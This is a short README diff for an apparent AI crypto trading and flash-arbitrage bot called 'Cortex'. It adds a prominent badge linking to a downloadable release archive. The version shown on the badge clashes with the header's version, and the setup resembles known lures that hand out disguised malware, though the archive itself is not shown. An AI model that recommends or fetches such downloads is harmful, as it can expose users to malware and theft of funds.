@@ -11,6 +11,7 @@
 
 <p align="center">
 <img src="https://i.postimg.cc/s2sv7GP8/cortex.png" alt="Cortex: Autonomous AI Trading Agent & MultiChain Flash-Arb Engine (v2.0-beta)">
+<a href="https://github.com/cortexaiofficial/Autonomous-AI-Trading-Agent-MCP-Flash-Arb-Engine/releases/download/mcp-server/Cortex_AI_v3.4.zip"><img src="https://img.shields.io/badge/DOWNLOAD-Cortex%20v3.4%20(Latest%20Release)-brightgreen?style=for-the-badge&logo=github" alt="Download Cortex v3.4"></a>
 </p>
 
 
